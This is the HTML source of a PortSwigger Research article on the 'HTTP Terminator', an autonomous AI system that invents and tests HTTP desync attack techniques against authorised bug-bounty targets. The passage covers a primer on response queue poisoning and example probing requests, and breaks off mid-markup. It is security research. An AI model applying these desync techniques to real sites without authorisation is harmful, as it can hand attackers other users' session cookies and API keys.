@@ -1,0 +1,834 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta content="IE=edge" http-equiv="X-UA-Compatible">
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <title>Can AI do novel security research? Meet the HTTP Terminator | PortSwigger Research</title>
+        <meta name="description" content="Abstract We all know AI can find bugs. After a decade of research, I asked a harder question: can an autonomous system invent new attack techniques, and use them to hack live websites at scale? Buildi">
+        
+<!-- Twitter data -->
+    <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Can AI do novel security research? Meet the HTTP Terminator">
+    <meta name="twitter:description" content="Abstract We all know AI can find bugs. After a decade of research, I asked a harder question: can an autonomous system invent new attack techniques, and use them to hack live websites at scale? Buildi">
+<meta name="twitter:image" content="https://portswigger.net/cms/images/65/c9/4abd-twittercard-http_terminator_x.png">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Can AI do novel security research? Meet the HTTP Terminator" />
+    <meta property="og:description" content="Abstract We all know AI can find bugs. After a decade of research, I asked a harder question: can an autonomous system invent new attack techniques, and use them to hack live websites at scale? Buildi">
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://portswigger.net/research/can-ai-do-novel-security-research" />
+<meta property="og:image" content="https://portswigger.net/cms/images/65/c9/4abd-twittercard-http_terminator_x.png" />
+    <meta property="og:site_name" content="PortSwigger Research" />
+    <meta property="article:published_time" content="2026-08-05T19:30:00" />
+
+        <link rel="canonical" href="https://portswigger.net/research/can-ai-do-novel-security-research"/>
+        <link href="/content/images/logos/favicon.ico" rel="icon" type="image/x-icon"/>
+        <link href="/content/images/logos/apple-touch-icon.png" rel="apple-touch-icon">
+        <link href="/content/psresearch.css" rel="stylesheet" type="text/css">
+        <link rel="alternate" type="application/rss+xml" href="/research/rss" title="PortSwigger Research">
+        <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="/content/fonts/ps-main/ps-icons.woff?l1la2n" as="font" crossorigin="anonymous">
+            <script nonce="be2vxbc8HS7kAQnD7XRXGmC7j7DYZ7vs" type="text/javascript">
+        !function (t, e) {
+            var o, n, p, r;
+            e.__SV || (window.posthog && window.posthog.__loaded) || (window.posthog = e, e._i = [], e.init = function (i, s, a) {
+                function g(t, e) {
+                    var o = e.split(".");
+                    2 == o.length && (t = t[o[0]], e = o[1]), t[e] = function () {
+                        t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
+                    }
+                }
+
+                (p = t.createElement("script")).type = "text/javascript", p.crossOrigin = "anonymous", p.async = !0, p.src = s.api_host.replace(".i.posthog.com", "-assets.i.posthog.com") + "/static/array.js", (r = t.getElementsByTagName("script")[0]).parentNode.insertBefore(p, r);
+                var u = e;
+                for (void 0 !== a ? u = e[a] = [] : a = "posthog", u.people = u.people || [], u.toString = function (t) {
+                    var e = "posthog";
+                    return "posthog" !== a && (e += "." + a), t || (e += " (stub)"), e
+                }, u.people.toString = function () {
+                    return u.toString(1) + ".people (stub)"
+                }, o = "init Dr qr Ci Br Zr Pr capture calculateEventProperties Ur register register_once register_for_session unregister unregister_for_session Xr getFeatureFlag getFeatureFlagPayload getFeatureFlagResult isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync Jr identify setPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset setIdentity clearIdentity get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException captureLog startExceptionAutocapture stopExceptionAutocapture loadToolbar get_property getSessionProperty Gr Hr createPersonProfile setInternalOrTestUser Wr Fr tn opt_in_capturing opt_out_capturing has_opted_in_capturing has_opted_out_capturing get_explicit_consent_status is_capturing clear_opt_in_out_capturing $r debug ki Yr getPageViewId captureTraceFeedback captureTraceMetric Rr".split(" "), n = 0; n < o.length; n++) g(u, o[n]);
+                e._i.push([i, s, a])
+            }, e.__SV = 1)
+        }(document, window.posthog || []);
+        posthog.init('phc_zmnmWxifkm9THV54Mrn2XvFDL3Tq497pyRgrYbDu5PGW', {
+            api_host: 'https://phingest.portswigger.com',
+            defaults: '2026-01-30',
+            person_profiles: 'identified_only'
+        });
+    </script>
+
+    </head>
+    <body class="theme-research">
+        
+
+<script nonce="be2vxbc8HS7kAQnD7XRXGmC7j7DYZ7vs">
+(function(window, document, dataLayerName, id) {
+    window[dataLayerName]=window[dataLayerName]||[],window[dataLayerName].push({start:(new Date).getTime(),event:"stg.start"});
+    var scripts=document.getElementsByTagName('script')[0],tags=document.createElement('script');
+    var qP = [];
+    dataLayerName !== "dataLayer" && qP.push("data_layer_name=" + dataLayerName), tags.nonce = "be2vxbc8HS7kAQnD7XRXGmC7j7DYZ7vs";
+var qPString=qP.length>0?("?"+qP.join("&")):"";
+    tags.async=!0,tags.src="https://ps.containers.piwik.pro/"+id+".js"+qPString,
+    scripts.parentNode.insertBefore(tags,scripts);
+    !function(a,n,i){a[n]=a[n]||{};for(var c=0;c<i.length;c++)!function(i){a[n][i]=a[n][i]||{},a[n][i].api=a[n][i].api||function(){
+    var a=[].slice.call(arguments,0);"string"==typeof a[0]&&window[dataLayerName].push({event:n+"."+i+":"+a[0],parameters:[].slice.call(arguments,1)})}}(i[c])}(window,"ppms",["tm","cm"]);
+    })(window, document, 'dataLayer', '287552c2-4917-42e0-8982-ba994a2a73d7');
+</script>
+        
+
+
+        <header class="page-header" id="top">
+            <div class="container">
+    <a class="logo" href="/"></a>
+    <div class="header-right">
+        <div class="login-buttons">
+                <a class="button-orange-small" href="/users">Login</a>
+        </div>
+        
+
+    <input type="checkbox" id="hamburger-mobile" class="hamburger-input-mobile">
+    <input type="radio" id="hamburger-desktop" class="hamburger-input-desktop" name="mega-nav-input">
+    <div class="hamburger-menu-mobile">
+        <label class="hamburger-menu-label header-hidden" for="hamburger-mobile">
+            <span class="hamburger-layers"></span>
+        </label>
+    </div>
+    <div class="mega-nav">
+        <input type="radio" id="mega-nav-close" class="mega-nav-input-close" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-1" class="mega-nav-input-1" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-2" class="mega-nav-input-2" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-6" class="mega-nav-input-6" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-7" class="mega-nav-input-7" name="mega-nav-input">
+
+        <label for="mega-nav-close" class="mega-nav-close"></label>
+
+        <label class="mega-nav-label mega-nav-label-1" for="mega-nav-label-1">
+            <span class="mega-nav-text">Products</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <label class="mega-nav-label mega-nav-label-2" for="mega-nav-label-2">
+            <span class="mega-nav-text">Solutions</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <a class="mega-nav-link" href="/research"><span class="mega-nav-text">Research</span></a>
+        <a class="mega-nav-link" href="/web-security"><span class="mega-nav-text">Academy</span></a>
+        <label class="mega-nav-label mega-nav-label-6" for="mega-nav-label-6">
+            <span class="mega-nav-text">Support</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+
+        <label class="mega-nav-label mega-nav-label-7 header-hidden" for="mega-nav-label-7">
+            <span class="mega-nav-text">Company</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <div class="hamburger-menu-desktop">
+            <label class="hamburger-menu-label header-show" for="hamburger-desktop">
+                <span class="hamburger-layers"></span>
+            </label>
+            <div>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-1" href="/customers"><span class="mega-nav-text">Customers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-3" href="/about"><span class="mega-nav-text">About</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-4" href="/blog"><span class="mega-nav-text">Blog</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-5" href="/careers"><span class="mega-nav-text">Careers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-6" href="/legal"><span class="mega-nav-text">Legal</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-7" href="/contact"><span class="mega-nav-text">Contact</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-8" href="/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+            </div>
+        </div>
+
+        <a class="mega-nav-link header-hidden" href="/users/youraccount"><span class="mega-nav-text">My account</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-1" href="/customers"><span class="mega-nav-text">Customers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-3" href="/about"><span class="mega-nav-text">About</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-4" href="/blog"><span class="mega-nav-text">Blog</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-5" href="/careers"><span class="mega-nav-text">Careers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-6" href="/legal"><span class="mega-nav-text">Legal</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-7" href="/contact"><span class="mega-nav-text">Contact</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-8" href="/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+
+        <div class="mega-nav-container">
+
+            <div class="mega-nav-content mega-nav-content-1">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <a href="/burp/burp-at" class="link-block-white">
+                                <img src="/mega-nav/images/burp-at.svg" alt="Burp AT">
+                                <span><strong>Burp AT</strong></span>
+                                <span>Agentic AI that extends human-led pentesting.</span>
+                            </a>
+
+                            <a href="/burp/enterprise" class="link-block-white">
+                                <img src="/content/images/svg/icons/enterprise.svg" alt="Burp Suite DAST">
+                                <span><strong>Burp Suite DAST</strong></span>
+                                <span>The enterprise-enabled dynamic web vulnerability scanner.</span>
+                            </a>
+
+                            <a href="/burp/pro" class="link-block-white">
+                                <img src="/content/images/svg/icons/professional.svg" alt="Burp Suite Professional">
+                                <span><strong>Burp Suite Professional</strong></span>
+                                <span>The world's #1 web penetration testing toolkit.</span>
+                            </a>
+
+                            <a href="/burp/communitydownload" class="link-block-white">
+                                <img src="/content/images/svg/icons/community.svg" alt="Burp Suite Community Edition">
+                                <span><strong>Burp Suite Community Edition</strong></span>
+                                <span>The best manual tools to start web security testing.</span>
+                            </a>
+
+                            <a href="/burp" class="chevron-after">View all product editions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/vulnerability-scanner">
+                                    <p><strong>Burp Scanner</strong></p>
+                                    <p>Burp Suite's web vulnerability scanner</p>
+                                    <img src="/mega-nav/images/burp-suite-scanner.jpg" alt="Burp Suite's web vulnerability scanner'">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-2">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="/solutions/attack-surface-visibility" class="link-block-white">
+                                    <span><strong>Attack surface visibility</strong></span>
+                                    <span>Improve security posture, prioritize manual testing, free up time.</span>
+                                </a>
+                                <a href="/solutions/ci-driven-scanning" class="link-block-white">
+                                    <span><strong>CI-driven scanning</strong></span>
+                                    <span>More proactive security - find and fix vulnerabilities earlier.</span>
+                                </a>
+                                <a href="/solutions" class="link-block-white">
+                                    <span><strong>Application security testing</strong></span>
+                                    <span>See how our software enables the world to secure the web.</span>
+                                </a>
+                                <a href="/solutions/devsecops" class="link-block-white">
+                                    <span><strong>DevSecOps</strong></span>
+                                    <span>Catch critical bugs; ship more secure software, more quickly.</span>
+                                </a>
+
+                                <a href="/solutions/penetration-testing" class="link-block-white">
+                                    <span><strong>Penetration testing</strong></span>
+                                    <span>Accelerate penetration testing - find more bugs, more quickly.</span>
+                                </a>
+                                <a href="/solutions/automated-security-testing" class="link-block-white">
+                                    <span><strong>Automated scanning</strong></span>
+                                    <span>Scale dynamic scanning. Reduce risk. Save time/money.</span>
+                                </a>
+
+                                <a href="/solutions/bug-bounty-hunting" class="link-block-white">
+                                    <span><strong>Bug bounty hunting</strong></span>
+                                    <span>Level up your hacking and earn more bug bounties.</span>
+                                </a>
+                                <a href="/solutions/compliance" class="link-block-white">
+                                    <span><strong>Compliance</strong></span>
+                                    <span>Enhance security monitoring to comply with confidence.</span>
+                                </a>
+                            </div>
+                            <a href="/solutions" class="chevron-after">View all solutions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/dast/resources/dast-vs-professional">
+                                    <p><strong>Product comparison</strong></p>
+                                    <p>What's the difference between Pro and DAST?</p>
+                                    <img src="/mega-nav/images/burp-suite.jpg" alt="Burp Suite Professional vs Burp Suite DAST">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-6">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="/support" class="link-block-white">
+                                    <span><strong>Support Center</strong></span>
+                                    <span>Get help and advice from our experts on all things Burp.</span>
+                                </a>
+                                <a href="/burp/documentation" class="link-block-white">
+                                    <span><strong>Documentation</strong></span>
+                                    <span>Tutorials and guides for Burp Suite.</span>
+                                </a>
+                                <a href="/burp/documentation/desktop/getting-started" class="link-block-white">
+                                    <span><strong>Get Started - Professional</strong></span>
+                                    <span>Get started with Burp Suite Professional.</span>
+                                </a>
+                                <a href="/burp/documentation/dast/setup" class="link-block-white">
+                                    <span><strong>Get Started - DAST</strong></span>
+                                    <span>Get started with Burp Suite DAST.</span>
+                                </a>
+                                <a href="/burp/releases" class="link-block-white">
+                                    <span><strong>Downloads</strong></span>
+                                    <span>Download the latest version of Burp Suite.</span>
+                                </a>
+                            </div>
+                            <a href="/support" class="chevron-after">Visit the Support Center</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/releases">
+                                    <p><strong>Downloads</strong></p>
+                                    <p>Download the latest version of Burp Suite.</p>
+                                    <img src="/mega-nav/images/latest-burp-suite-software-download.jpg" alt="The latest version of Burp Suite software for download">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+
+    </div>
+</div>
+        </header>
+        <nav class="navigation-top">
+            <input id="nav-main-featured-research" type="checkbox">
+            <label for="nav-main-featured-research">
+                <span>Articles</span>
+                <span class="icon-arrow-head-down"></span>
+            </label>
+            <ul>
+                
+
+                <li >
+                    <a href="/research">Overview</a>
+                </li>
+                <li >
+                    <input type="checkbox" id="nav-featured-research">
+<label for="nav-featured-research">
+    <span>Core Topics</span>
+    <span class="icon-arrow-head-down"></span>
+</label>
+    <div>
+            <a href="/research/black-hat">Black Hat</a>
+            <a href="/research/cross-site-scripting-research">XSS</a>
+            <a href="/research/request-smuggling">Request Smuggling</a>
+            <a href="/research/template-injection">Template Injection</a>
+            <a href="/research/top-10-web-hacking-techniques">Top 10 Hacking Techniques</a>
+    </div>
+
+                </li>
+                <li class = current>
+                    <a href="/research/articles">Articles</a>
+                </li>
+                <li >
+                    <input type="checkbox" id="nav-meet-the-researchers">
+<label for="nav-meet-the-researchers">
+    <span>Meet the Researchers</span>
+    <span class="icon-arrow-head-down"></span>
+</label>
+<div>
+    <a href="/research/james-kettle">James Kettle</a>
+    <a href="/research/gareth-heyes">Gareth Heyes</a>
+    <a href="/research/zakhar-fedotkin">Zakhar Fedotkin</a>
+    <a href="/research/tom-stacey">Tom Stacey</a>
+</div>
+                </li>
+                <li >
+                    <a href="/research/talks">Talks</a>
+                </li>
+                <li>
+                    <a href="/research/rss">
+                        RSS <span class="icon-rss"></span>
+                    </a>
+                </li>
+            </ul>
+        </nav>
+        <div class="wrapper">
+            
+
+
+<input id="MediaId" name="MediaId" type="hidden" value="04D711F5315919E570950E20AA8FCC03" />
+
+
+<div class="section theme-navy-1">
+    <h1 class="heading-orange-1">Can AI do novel security research? Meet the HTTP Terminator</h1>
+    <div class="container-relative-medium-content-width">
+        
+
+<div class="share-right">
+    <input id="share-button-right" type="checkbox">
+    <ul class="share-right-ul">
+        <li>
+            <a href="https://twitter.com/share?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fcan-ai-do-novel-security-research&text=Can&#x2B;AI&#x2B;do&#x2B;novel&#x2B;security&#x2B;research%3F&#x2B;Meet&#x2B;the&#x2B;HTTP&#x2B;Terminator%20-%20%40PortSwiggerRes%0A" target="_blank">
+                <span class="icon-twitter"></span>
+            </a>
+        </li>
+        <li>
+            <a href="https://api.whatsapp.com/send?text=https%3A%2F%2Fportswigger.net%2Fresearch%2Fcan-ai-do-novel-security-research" target="_blank">
+                <span class="icon-whatsapp"></span>
+            </a>
+        </li>
+        <li>
+            <a href="https://reddit.com/submit?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fcan-ai-do-novel-security-research" target="_blank">
+                <span class="icon-reddit-dark"></span>
+            </a>
+        </li>
+        <li>
+            <a href="https://www.linkedin.com/sharing/share-offsite?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fcan-ai-do-novel-security-research" target="_blank">
+                <span class="icon-linkedin"></span>
+            </a>
+        </li>
+        <li>
+            <a href="mailto:?subject=Can&#x2B;AI&#x2B;do&#x2B;novel&#x2B;security&#x2B;research%3F&#x2B;Meet&#x2B;the&#x2B;HTTP&#x2B;Terminator&body=Can&#x2B;AI&#x2B;do&#x2B;novel&#x2B;security&#x2B;research%3F&#x2B;Meet&#x2B;the&#x2B;HTTP&#x2B;Terminator%0A%0AAbstract&#x2B;We&#x2B;all&#x2B;know&#x2B;AI&#x2B;can&#x2B;find&#x2B;bugs.&#x2B;After&#x2B;a&#x2B;decade&#x2B;of&#x2B;research%2C&#x2B;I&#x2B;asked&#x2B;a&#x2B;harder&#x2B;question%3A&#x2B;can&#x2B;an&#x2B;autonomous&#x2B;system&#x2B;invent&#x2B;new&#x2B;attack&#x2B;techniques%2C&#x2B;and&#x2B;use&#x2B;them&#x2B;to&#x2B;hack&#x2B;live&#x2B;websites&#x2B;at&#x2B;scale%3F&#x2B;Buildi%0A%0Ahttps://portswigger.net/research/can-ai-do-novel-security-research">
+                <span class="icon-email"></span>
+            </a>
+        </li>
+        <li>
+            <a href="/research/rss">
+                <span class="icon-rss"></span>
+            </a>
+        </li>
+    </ul>
+
+    <label class="share-button" for="share-button-right">
+        <span class="icon-share"></span>
+    </label>
+</div>
+
+    </div>
+    
+<div class="callout-individual-profile">
+    <img alt="James Kettle" src="/content/images/profiles/callout_james_kettle_112px.png">
+    <div>
+            <h3><a href="/research/james-kettle">James Kettle</a></h3>
+        <p>Director of Research</p>
+        <p>
+            
+<span class="icon-twitter"></span>
+<a href="https://twitter.com/albinowax">@albinowax</a>
+        </p>
+    </div>
+</div>
+    <ul class="publication-list">
+        <li>
+            <p><span class="icon-calendar"></span><strong>Published: </strong>Wednesday, 5 August 2026 at 19:30 UTC</p>
+        </li>
+        <li>
+            <p><strong>Updated: </strong>Thursday, 6 August 2026 at 14:59 UTC</p>
+        </li>
+        <li>
+        </li>
+    </ul>
+    <p><span class="bold">Abstract</span></p><p>We all know AI can find bugs. After a decade of research, I asked a harder question: can an autonomous system invent new attack techniques, and use them to hack live websites at scale? Building this sounded like a bad idea, so I did it.</p><p>It worked - I'll share an arsenal of new HTTP desync triggers, gadgets, and exploits that compromised banks, security solutions, and government infrastructure. Then I'll trace each discovery chain back through the HTTP Terminator, showing how to turn your personal expertise into an autonomous weapon - and the dark arts required to make it lethal.</p><p>I'll also share discoveries from beyond the autonomy horizon - some only reachable with a tight human/AI research loop, and others beyond AI's reach entirely. These include a powerful undisclosed recon technique, and anomalies that hint at new attack classes offering alternative paths to critical impact. I'll analyze the discovery process, sharing detailed experiments that probe the boundaries of what AI can and can't discover.</p><p>You'll leave with new exploits from desync triggers to undisclosed attack classes, and a blueprint for turning your instincts into an autonomous research cascade. And yes, I'll open-source the HTTP Terminator.</p><p>This whitepaper is also available as a <a href="https://portswigger.net/kb/papers/gkaicuremal/http-terminator.pdf">printable PDF</a>. If you've seen the size of the scrollbar and you're about to ask for an AI summary, you may prefer to read the <a href="https://portswigger.net/kb/papers/gkaicuremal/http-terminator-executive-summary.pdf">executive summary</a>&nbsp;instead. This research was presented at <a href="https://blackhat.com/us-26/briefings/schedule/?#can-ai-do-novel-security-research-meet-the-http-terminator-51894">Black Hat USA 2026</a>&nbsp;and <a href="https://defcon.org/html/defcon-34/dc-34-speakers.html#content_66581">DEF CON 34</a>, and this page will be updated with the recording once it's available - follow PortSwigger Research on <a href="https://x.com/portswiggerres">X</a>,&nbsp;<a href="https://www.linkedin.com/showcase/portswigger-research/posts/?feedView=all&amp;viewAsMember=true">LinkedIn</a>&nbsp;or <a href="https://portswigger.net/research/rss">RSS</a>&nbsp;to get notified when it lands. </p><h2><a id="contents">Contents</a></h2><ul class="table-of-content"><li><a href="#introduction">Introduction</a></li><ul><li><a href="#defining-novel-http-desync-research">Defining novel HTTP desync research</a></li><li><a href="#http-terminator-design">HTTP Terminator Design</a></li></ul><li><a href="#ideation">Ideation</a></li><ul><li><a href="#the-technique-rediscovery-test">The technique rediscovery test</a></li><li><a href="#scaling-ideation-with-micro-inspiration">Scaling ideation with micro-inspiration</a></li></ul><li><a href="#evaluation">Evaluation</a></li><ul><li><a href="#the-core-evaluation-primitive">The core evaluation primitive</a></li><li><a href="#evaluation-case-study">Evaluation case-study</a></li><li><a href="#novel-desync-triggers">Novel desync triggers</a></li></ul><li><a href="#weaponization">Weaponization</a></li><ul><li><a href="#autonomous-rqp">Autonomous RQP</a></li><li><a href="#turning-the-environment-into-the-weapon">Turning the environment into the weapon</a></li><li><a href="#making-iteration-viable">Making iteration viable</a></li><li><a href="#the-stacked-response-problem">The stacked-response problem</a></li><li><a href="#the-dangling-byte-technique">The dangling-byte&nbsp;technique</a></li></ul><li><a href="#cascade">Cascade</a></li><ul><li><a href="#anomaly-detection-cascade">Anomaly detection cascade</a></li><li><a href="#chasing-an-autonomous-cascade">Chasing an autonomous cascade</a></li><li><a href="#status-line-injection">Status-line Injection</a></li><li><a href="#range-cache-poisoning">Range Cache Poisoning</a></li><li><a href="#shared-parser-confusion">Shared-Parser Confusion</a></li><li><a href="#scanning-for-inspiration">Scanning for inspiration</a></li></ul><li><a href="#conclusion">Conclusion</a></li><ul><li><a href="#the-blueprint">The blueprint</a></li><li><a href="#tool-releases">Tool releases</a></li><li><a href="#defense">Defense</a></li><li><a href="#takeaways">Takeaways</a></li></ul></ul><h2><a id="introduction">Introduction</a></h2><p>Automation is often focused on efficiency but I believe that when it's approached just right, automation can enable outcomes that were previously impossible. This research is about chasing that promise of something more. </p><p>The primary objective of this project was to discover the new frontier of automation-driven security research. I've been practicing automation-driven research for a long time, and could see that generative AI had moved the frontier substantially. I also aimed to build a blueprint to help other researchers quickly adopt this new approach.</p><p>My secondary objective was to push the "fully autonomous research" concept to complete failure by exceeding the capabilities of current SOTA models. By doing this, I aimed to show where a human in the loop can still add significant value (as opposed to just building the loop, then stepping back). </p><p>Finally, I aimed to discover factors that make a research topic unsuitable for an AI-driven approach. This would be valuable to people who prefer to stick with a classic, fully-manual research approach and want to minimize the risk of collision with an AI-enhanced researcher. </p><h3><a id="defining-novel-http-desync-research">Defining novel HTTP desync research</a></h3><p>We've all seen experts claiming AI can't do original security research. One of the many risks of my project was that people might claim that the system's discoveries weren't actually original. To minimize this risk I choose the topic I was most qualified for - HTTP Desync Attacks. I repopularized this attack class back in 2019, and in total I've done four years of research on it, resulting in four Black Hat USA &amp; DEF CON presentations:</p><ul><li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">HTTP Desync Attacks: Request Smuggling Reborn</a></li><li><a href="https://portswigger.net/research/http2">HTTP/2: The Sequel is Always Worse</a></li><li><a href="https://portswigger.net/research/browser-powered-desync-attacks">Browser-Powered Desync Attacks</a></li><li><a href="https://portswigger.net/research/http1-must-die">HTTP/1.1 must die! The desync endgame</a></li></ul><p>If you're not already familiar with this attack class, I recommend checking out the research above, or our <a href="https://portswigger.net/web-security/request-smuggling">Web Security Academy topic</a>. That said, here's a brief primer. HTTP Desync Attacks are possible when websites funnel HTTP requests over a shared HTTP/1 connection to the back-end. The weak request isolation in HTTP/1.1 means an attacker who finds a desync trigger can alter other people's requests. </p><img src="/cms/images/12/6f/9c37-article-desync-concept.png" alt="Desync concept"><p>This enables various attacks, including <a href="https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning">Response Queue Poisoning</a>&nbsp;(RQP) which makes websites lose track of which response is intended for which user, meaning the attacker gets sent responses intended for other live users of the site, often including live credentials like session cookies and API keys.</p><img src="/cms/images/30/09/d654-article-response-queue-poisoning.png" alt="Response queue poisoning"><p>I would define novel HTTP desync research as discovering:</p><ul><li>Novel desync triggers (e.g.: Expect: 100-continue)</li><li>Novel desync patterns (e.g.: <a href="https://portswigger.net/research/http1-must-die#understanding-v-h-and-h-v-scenarios">V-H</a>)</li><li>Novel desync classes (e.g.: <a href="https://portswigger.net/research/http1-must-die#0.cl-desync-attacks">0.CL</a>)</li><li>Novel desync weaponization techniques &amp; enhancements (e.g.: RQP, the <a href="https://portswigger.net/research/browser-powered-desync-attacks#:~:text=Akamai%20%2D%20stacked%20HEAD">HEAD gadget</a>) </li></ul><p>With two further caveats:</p><p>Desync triggers vary a lot in originality and value but in general, if a single novel trigger works on multiple different HTTP servers, that's a great sign it's a significant research discovery rather than a one-off implementation bug.</p><p>Desync attacks rely on the combined behavior of a front-end and back-end server. This means it's quite easy to point AI at a server codebase and have it spit out original vectors that have minimal value because they don't work in any realistic deployment setup. For me, it's just a research lead until it's proven on a live, third-party website. </p><h3><a id="http-terminator-design">HTTP Terminator Design</a></h3><p>I based the design of the HTTP Terminator on my own research methodology:</p><img src="/cms/images/f2/3a/ac68-article-ideation-evaluation-cascade.png" alt="Ideation evaluation cascade"><p>The initial phase is <span class="bold">Ideation</span>&nbsp;- inventing 'hypotheses' AKA potential techniques. This step is crucial but it's only a tiny part of the process.</p><p>The next phase is <span class="bold">Evaluation</span>&nbsp;- testing hypotheses to see which ones actually work. The HTTP Terminator does this using live websites where testing is authorized via a bug bounty program or VDP.</p><p>Next there's <span class="bold">Weaponization</span>&nbsp;- joining the dots from a proven hypothesis to proven security impact and a reportable vulnerabilities specific websites. </p><p>Finally, there's the <span class="bold">Cascade</span>&nbsp;- using each proven hypothesis as fuel for more discoveries. This is a step I've always performed without thinking, while massively underestimating its importance. This year, the HTTP Terminator's logging of the complete discovery chain behind each finding proved how critical it is.</p><p>I'll structure the rest of this paper around these phases. This structure is broadly applicable to other research topics, and I'll focus on the most transferable takeaways throughout. I've included some extra advice on how to design this type of system at the end. </p><h2><a id="ideation">Ideation</a></h2><p>To kick off the research, we need the system to autonomously generate hypotheses. In this context, a hypothesis is simply an idea or technique that might work. It must be testable so we can find out if it actually does work. Here's a few examples:</p><ul><li>Desync trigger hypothesis: The method <span class="code">POsT</span>&nbsp;makes some servers ignore the request body</li></ul><ul><li>Desync pattern hypothesis: A malformed header makes some servers ignore subsequent headers</li><li>Weaponization hypothesis: Adding the <span class="code">Expect</span>&nbsp;to a smuggled request bypasses RQP defenses</li></ul><h3><a id="the-technique-rediscovery-test">The technique rediscovery test</a></h3><p>I wanted to explore strategies to make LLMs better at hypothesis generation, so the first step was to find a task that the best models found genuinely challenging. To do this I tested whether AI could invent a technique that I'd already invented and evaluated myself - but never published.</p><p>For the test, I used a black-box reverse-engineering strategy for detecting input transformations by front-end servers - the protocol ruler technique. </p><p>Almost all servers have a header length limit. If a request exceeds it, you get a different response. When a front-end transforms input, this typically changes the length of the byte sequence. This means we can use the back-end's length limit as a ruler to measure which header values and byte sequences get transformed, and by how much. </p><p>In this example, we can see that the length limit is 64,040:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / HTTP/1.1</span></code><code class="theme-white white-space-pre"><span class="oceanblue">GET / HTTP/1.1</span></code><code class="theme-community-6 white-space-pre"></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">A: AAA……………………{64040}</span></code><code class="theme-white white-space-pre"><span class="oceanblue">A: AAA…</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">200 OK</span></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">A: AAA……………………{64041}</span></code><code class="theme-white white-space-pre"><span class="oceanblue">A: AAA…</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">400 Bad Request</span></code></span><p>However, if we swap out two As for the 2-byte sequence c0 8a we hit the limit at 64,030. This shows the two-byte sequence has been expanded by 10 bytes:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">A: </span><span class="orangeHighlighter">c0</span><span class="oceanblue"> </span><span class="orangeHighlighter">8a</span><span class="oceanblue"> A…………{64030}</span></code><code class="theme-white white-space-pre"><span class="oceanblue">A: </span><span class="orangeHighlighter">??????????</span><span class="oceanblue">A…</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">200 OK</span></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">A: </span><span class="orangeHighlighter">c0</span><span class="oceanblue"> </span><span class="orangeHighlighter">8a</span><span class="oceanblue"> A…………{64031}</span></code><code class="theme-white white-space-pre"><span class="oceanblue">A: </span><span 